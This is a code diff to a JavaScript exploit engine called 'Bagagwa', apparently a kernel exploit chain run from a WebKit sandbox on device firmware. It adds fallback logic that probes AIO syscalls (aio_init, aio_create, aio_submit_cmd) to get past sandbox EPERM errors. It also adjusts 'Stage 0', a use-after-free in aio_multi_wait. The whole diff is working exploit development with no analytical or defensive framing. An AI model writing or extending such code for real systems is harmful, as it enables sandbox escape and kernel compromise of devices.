@@ -185,13 +185,61 @@ export function makeBagagwaEngine(X) {
         return { base: ptr, u8, bytes: size, label };
     }
 
+    // AIO init: 3-tier fallback (mirrors slopkit_ref/bagagwa.js).
+    // Tier 1: aio_init (0x29E)  — global context. Blocked by WebKit sandbox on
+    //         some FWs (EPERM). NOT fatal — fall through.
+    // Tier 2: aio_create (0x29C) — per-channel fd, separate sandbox permission,
+    //         often allowed even when aio_init is not.
+    // Tier 3: probe aio_submit_cmd (0x29D) — if that's also EPERM, AIO really is
+    //         fully sandboxed and no code change can help from this entry point.
     async function initAio() {
         if (S.aioInited) return { ok: true, cached: true };
-        const r = await sys(SYS_AIO_INIT, 0, 0);
-        if (r.failed) return { ok: false, why: "aio_init failed: " + r.errText };
+
+        // Tier 1: global aio_init (with proper params struct on newer FW)
+        const initBuf = alloc(0x10, "aio-init-params");
+        w32(initBuf.u8, 0x00, 0x10); // struct size
+        w32(initBuf.u8, 0x04, 32);   // max requests
+        w32(initBuf.u8, 0x08, 0);
+        w32(initBuf.u8, 0x0c, 0);
+        const r = await sys(SYS_AIO_INIT, initBuf.base);
+        if (!r.failed) {
+            S.aioInited = true;
+            note("AIO subsystem initialized via aio_init");
+            return { ok: true };
+        }
+        note("[S0-0a] aio_init ret=" + r.s32 + " err=" + r.errText +
+            " — falling through to aio_create (separate sandbox perm)");
+
+        // Tier 2: aio_create per-channel fd — avoids global init entirely.
+        for (const args of [[8, 0], [8], [0]]) {
+            const cr = await sys.apply(null, [SYS_AIO_CREATE].concat(args));
+            note("[S0-0b] aio_create(" + args.join(",") + ") ret=" + cr.s32 +
+                " err=" + cr.errText);
+            if (!cr.failed && cr.s32 >= 0) {
+                S.aioInited = true;
+                S.aioCtxFd = cr.s32;
+                S.aioInstances.push(cr.s32);
+                track(cr.s32);
+                note("AIO channel created via aio_create: ctxFd=" + cr.s32);
+                return { ok: true, via: "aio_create", ctxFd: cr.s32 };
+            }
+        }
+
+        // Tier 3: probe aio_submit_cmd — only if this is also EPERM is AIO
+        // genuinely fully sandboxed from this entry point.
+        const pr = await sys(SYS_AIO_SUBMIT_CMD, 0, 0, 0);
+        note("[S0-0c] aio_submit_cmd probe ret=" + pr.s32 + " err=" + pr.errText);
+        if (pr.failed && pr.errText === "EPERM") {
+            return { ok: false, why:
+                "AIO fully sandboxed: aio_init+aio_create+submit_cmd all EPERM " +
+                "from this entry point — need a different entry point or " +
+                "non-AIO kernel exploit" };
+        }
+        // submit_cmd reachable (EINVAL/other expected with null args): proceed
+        // optimistically — stage 0 will use the aio_create instance path.
+        note("aio_submit_cmd reachable — proceeding without global init");
         S.aioInited = true;
-        note("AIO subsystem initialized");
-        return { ok: true };
+        return { ok: true, via: "submit_cmd_probe" };
     }
 
     async function createAioInstance() {
@@ -547,7 +595,6 @@ export function makeBagagwaEngine(X) {
         note("=== Stage 0: aio_multi_wait mode 0 UAF ===");
 
         const stubs = [
-            [SYS_AIO_INIT, "aio_init"],
             [SYS_AIO_CREATE, "aio_create"],
             [SYS_AIO_SUBMIT, "aio_submit"],
             [SYS_AIO_MULTI_WAIT, "aio_multi_wait"],
@@ -565,7 +612,12 @@ export function makeBagagwaEngine(X) {
 
         const ir = await initAio();
         if (!ir.ok) { out.why = ir.why; return out; }
-        out.steps.push("AIO initialized");
+        if (ir.via && ir.via !== "aio_init") {
+            out.steps.push("AIO path via " + ir.via +
+                (ir.ctxFd !== undefined ? " (ctxFd=" + ir.ctxFd + ")" : ""));
+        } else {
+            out.steps.push("AIO initialized");
+        }
 
         const pipeBuf = alloc(8, "uaf-pipe");
         w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
